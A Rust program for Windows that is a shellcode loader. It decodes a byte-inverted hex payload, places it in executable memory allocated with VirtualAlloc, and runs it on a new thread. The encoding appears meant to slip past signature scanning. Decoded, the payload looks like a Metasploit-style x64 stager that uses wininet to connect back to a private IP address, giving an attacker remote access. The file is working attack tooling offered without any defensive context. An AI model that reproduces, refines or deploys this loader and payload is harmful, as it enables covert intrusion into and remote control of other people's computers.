use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use std::ptr::null_mut;
use std::mem::transmute;

fn main() {
    unsafe {
        //let mut buf: [u8; 589] =[0x3,0xb7,0x7c,0x1b,0xf,0x17,0x33,0xff,0xff,0xff,0xbe,0xae,0xbe,0xaf,0xad,0xae,0xb7,0xce,0x2d,0x9a,0xb7,0x74,0xad,0x9f,0xb7,0x74,0xad,0xe7,0xb7,0x74,0xad,0xdf,0xa9,0xb7,0xf0,0x48,0xb5,0xb5,0xb2,0xce,0x36,0xb7,0x74,0x8d,0xaf,0xb7,0xce,0x3f,0x53,0xc3,0x9e,0x83,0xfd,0xd3,0xdf,0xbe,0x3e,0x36,0xf2,0xbe,0xfe,0x3e,0x1d,0x12,0xad,0xb7,0x74,0xad,0xdf,0x74,0xbd,0xc3,0xb7,0xfe,0x2f,0xbe,0xae,0x99,0x7e,0x87,0xe7,0xf4,0xfd,0xf0,0x7a,0x8d,0xff,0xff,0xff,0x74,0x7f,0x77,0xff,0xff,0xff,0xb7,0x7a,0x3f,0x8b,0x98,0xb7,0xfe,0x2f,0xbb,0x74,0xbf,0xdf,0xaf,0xb6,0xfe,0x2f,0x74,0xb7,0xe7,0x1c,0xa9,0xb7,0x0,0x36,0xbe,0x74,0xcb,0x77,0xb7,0xfe,0x29,0xb2,0xce,0x36,0xb7,0xce,0x3f,0xbe,0x3e,0x36,0xf2,0x53,0xbe,0xfe,0x3e,0xc7,0x1f,0x8a,0xe,0xb3,0xfc,0xb3,0xdb,0xf7,0xba,0xc6,0x2e,0x8a,0x27,0xa7,0xbb,0x74,0xbf,0xdb,0xb6,0xfe,0x2f,0x99,0xbe,0x74,0xf3,0xb7,0xbb,0x74,0xbf,0xe3,0xb6,0xfe,0x2f,0xbe,0x74,0xfb,0x77,0xb7,0xfe,0x2f,0xbe,0xa7,0xbe,0xa7,0xa1,0xa6,0xa5,0xbe,0xa7,0xbe,0xa6,0xbe,0xa5,0xb7,0x7c,0x13,0xdf,0xbe,0xad,0x0,0x1f,0xa7,0xbe,0xa6,0xa5,0xb7,0x74,0xed,0x16,0xb4,0x0,0x0,0x0,0xa2,0xb7,0xce,0x24,0xac,0xb6,0x41,0x88,0x96,0x91,0x96,0x91,0x9a,0x8b,0xff,0xbe,0xa9,0xb7,0x76,0x1e,0xb6,0x38,0x3d,0xb3,0x88,0xd9,0xf8,0x0,0x2a,0xac,0xac,0xb7,0x76,0x1e,0xac,0xa5,0xb2,0xce,0x3f,0xb2,0xce,0x36,0xac,0xac,0xb6,0x45,0xc5,0xa9,0x86,0x58,0xff,0xff,0xff,0xff,0x0,0x2a,0x17,0xf0,0xff,0xff,0xff,0xce,0xc6,0xcd,0xd1,0xce,0xc9,0xc7,0xd1,0xcb,0xca,0xd1,0xce,0xca,0xcc,0xff,0xa5,0xb7,0x76,0x3e,0xb6,0x38,0x3f,0x44,0xfe,0xff,0xff,0xb2,0xce,0x36,0xac,0xac,0x95,0xfc,0xac,0xb6,0x45,0xa8,0x76,0x60,0x39,0xff,0xff,0xff,0xff,0x0,0x2a,0x17,0xdd,0xff,0xff,0xff,0xd0,0xa8,0xbc,0x85,0x8d,0xa5,0xc8,0xa5,0xce,0x9c,0xad,0xbb,0xac,0xc9,0xb1,0xaf,0x8e,0x8b,0xb1,0x8b,0xbd,0xc7,0x88,0xba,0xb4,0xb5,0xb9,0xc8,0xa7,0xa6,0x98,0xcb,0xa0,0xff,0xb7,0x76,0x3e,0xac,0xa5,0xbe,0xa7,0xb2,0xce,0x36,0xac,0xb7,0x47,0xff,0xcd,0x57,0x7b,0xff,0xff,0xff,0xff,0xaf,0xac,0xac,0xb6,0x38,0x3d,0x14,0xaa,0xd1,0xc4,0x0,0x2a,0xb7,0x76,0x39,0x95,0xf5,0xa0,0xb7,0x76,0xe,0x95,0xe0,0xa5,0xad,0x97,0x7f,0xcc,0xff,0xff,0xb6,0x76,0x1f,0x95,0xfb,0xbe,0xa6,0xb6,0x45,0x8a,0xb9,0x61,0x79,0xff,0xff,0xff,0xff,0x0,0x2a,0xb2,0xce,0x3f,0xac,0xa5,0xb7,0x76,0xe,0xb2,0xce,0x36,0xb2,0xce,0x36,0xac,0xac,0xb6,0x38,0x3d,0xd2,0xf9,0xe7,0x84,0x0,0x2a,0x7a,0x3f,0x8a,0xe0,0xb7,0x38,0x3e,0x77,0xec,0xff,0xff,0xb6,0x45,0xbb,0xf,0xca,0x1f,0xff,0xff,0xff,0xff,0x0,0x2a,0xb7,0x0,0x30,0x8b,0xfd,0x14,0x55,0x17,0xaa,0xff,0xff,0xff,0xac,0xa6,0x95,0xbf,0xa5,0xb6,0x76,0x2e,0x3e,0x1d,0xef,0xb6,0x38,0x3f,0xff,0xef,0xff,0xff,0xb6,0x45,0xa7,0x5b,0xac,0x1a,0xff,0xff,0xff,0xff,0x0,0x2a,0xb7,0x6c,0xac,0xac,0xb7,0x76,0x18,0xb7,0x76,0xe,0xb7,0x76,0x25,0xb6,0x38,0x3f,0xff,0xdf,0xff,0xff,0xb6,0x76,0x6,0xb6,0x45,0xed,0x69,0x76,0x1d,0xff,0xff,0xff,0xff,0x0,0x2a,0xb7,0x7c,0x3b,0xdf,0x7a,0x3f,0x8b,0x4d,0x99,0x74,0xf8,0xb7,0xfe,0x3c,0x7a,0x3f,0x8a,0x2d,0xa7,0x3c,0xa7,0x95,0xff,0xa6,0x44,0x1f,0xe2,0xd5,0xf5,0xbe,0x76,0x25,0x0,0x2a];
        

        let hex_string = "0x30xb70x7c0x1b0xf0x170x330xff0xff0xff0xbe0xae0xbe0xaf0xad0xae0xb70xce0x2d0xa90x9a0xb70x740xad0x9f0xb70x740xad0xe70xb70x740xad0xdf0xb70x740x8d0xaf0xb20xce0x360xb70xf00x480xb50xb50xb70xce0x3f0x530xc30x9e0x830xfd0xd30xdf0xbe0x3e0x360xf20xbe0xfe0x3e0x1d0x120xad0xb70x740xad0xdf0x740xbd0xc30xbe0xae0xb70xfe0x2f0x990x7e0x870xe70xf40xfd0xf00x7a0x8d0xff0xff0xff0x740x7f0x770xff0xff0xff0xb70x7a0x3f0x8b0x980xb70xfe0x2f0x740xb70xe70xbb0x740xbf0xdf0xaf0xb60xfe0x2f0x1c0xa90xb70x00x360xbe0x740xcb0x770xb70xfe0x290xb20xce0x360xb70xce0x3f0xbe0x3e0x360xf20x530xbe0xfe0x3e0xc70x1f0x8a0xe0xb30xfc0xb30xdb0xf70xba0xc60x2e0x8a0x270xa70xbb0x740xbf0xdb0xb60xfe0x2f0x990xbe0x740xf30xb70xbb0x740xbf0xe30xb60xfe0x2f0xbe0x740xfb0x770xbe0xa70xb70xfe0x2f0xbe0xa70xa10xa60xa50xbe0xa70xbe0xa60xbe0xa50xb70x7c0x130xdf0xbe0xad0x00x1f0xa70xbe0xa60xa50xb70x740xed0x160xb40x00x00x00xa20xb70xce0x240xac0xb60x410x880x960x910x960x910x9a0x8b0xff0xbe0xa90xb70x760x1e0xb60x380x3d0xb30x880xd90xf80x00x2a0xac0xac0xb70x760x1e0xac0xa50xb20xce0x3f0xb20xce0x360xac0xac0xb60x450xc50xa90x860x580xff0xff0xff0xff0x00x2a0x170xf10xff0xff0xff0xce0xc60xcd0xd10xce0xc90xc70xd10xcb0xc60xd10xca0xce0xff0xa50xb70x760x3e0xb60x380x3f0x440xfe0xff0xff0xb20xce0x360xac0xac0x950xfc0xac0xb60x450xa80x760x600x390xff0xff0xff0xff0x00x2a0x170x960xff0xff0xff0xd00x9b0x900xaa0xcf0xb20xb20xc80x8e0x890xaf0x8a0x870x860xc80xbb0xb50xce0xa00xc90x870x9a0xbe0x970xb60xab0xa50x920xd20x850xc70x980x8c0x9c0xb70x9e0xa80x8b0x8e0xcc0x8e0x8f0x940x9d0xaf0xa80x900xa60xc90x990x910xb50x870x8a0x9c0x990xa50xb60xbd0xb40x900x900x9d0x940xcf0x930xb50xb60xae0xbd0xd20xc90xa90xb70xc80xcc0x8e0x890x8f0xcd0x990xaf0x8b0xae0xba0xcb0x940xba0xa90xab0xb30x8c0x850xac0xc60xb50xc60x8b0xba0x920xc90x9d0x880x950xff0xb70x760x3e0xac0xa50xbe0xa70xb20xce0x360xac0xb70x470xff0xcd0x570x7b0xff0xff0xff0xff0xaf0xac0xac0xb60x380x3d0x140xaa0xd10xc40x00x2a0xb70x760x390x950xf50xa00xb70x760xe0x950xe00xa50xad0x970x7f0xcc0xff0xff0xb60x760x1f0x950xfb0xbe0xa60xb60x450x8a0xb90x610x790xff0xff0xff0xff0x00x2a0xb20xce0x3f0xac0xa50xb70x760xe0xb20xce0x360xb20xce0x360xac0xac0xb60x380x3d0xd20xf90xe70x840x00x2a0x7a0x3f0x8a0xe00xb70x380x3e0x770xec0xff0xff0xb60x450xbb0xf0xca0x1f0xff0xff0xff0xff0x00x2a0xb70x00x300x8b0xfd0x140x550x170xaa0xff0xff0xff0xac0xa60x950xbf0xa50xb60x760x2e0x3e0x1d0xef0xb60x380x3f0xff0xef0xff0xff0xb60x450xa70x5b0xac0x1a0xff0xff0xff0xff0x00x2a0xb70x6c0xac0xac0xb70x760x180xb70x760xe0xb70x760x250xb60x380x3f0xff0xdf0xff0xff0xb60x760x60xb60x450xed0x690x760x1d0xff0xff0xff0xff0x00x2a0xb70x7c0x3b0xdf0x7a0x3f0x8b0x4d0x990x740xf80xb70xfe0x3c0x7a0x3f0x8a0x2d0xa70x3c0xa70x950xff0xa60x440x1f0xe20xd50xf50xbe0x760x250x00x2a";

        // "0x"で文字列を分割し、空でない部分だけを取得
        let parts: Vec<&str> = hex_string.split("0x").filter(|&s| !s.is_empty()).collect();
    
        let mut bytes = vec![];
        for part in parts {
            let hex_bytes: Vec<u8> = part
                .split("x")
                .filter(|&s| !s.is_empty())
                .map(|s| u8::from_str_radix(s, 16).unwrap())
                .collect();
            bytes.extend_from_slice(&hex_bytes);
        }
    
        // バイト配列を固定配列に変換
        let mut buf = bytes;

    
        println!("Bytes: {:?}", buf);

        for i in 0..buf.len() {
            buf[i] = 0xFF - buf[i];
        }
        //buf.reverse();

   


        let size = buf.len();

        let addr = VirtualAlloc(
            null_mut(),
            0x4000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        ) as *mut u8;

        if addr.is_null() {
            panic!("VirtualAlloc failed");
        }

        std::ptr::copy_nonoverlapping(buf.as_ptr(), addr, size);

        let thread_start: unsafe extern "system" 
            fn(*mut winapi::ctypes::c_void) -> u32 = 
                transmute(addr as *mut winapi::ctypes::c_void);

        let h_thread = CreateThread(
            null_mut(),
            0,
            Some(transmute(thread_start)),
            null_mut(),
            0,
            null_mut(),
        );

        if h_thread.is_null() {
            panic!("CreateThread failed");
        }

        WaitForSingleObject(h_thread, 0xFFFFFFFF);
    }
}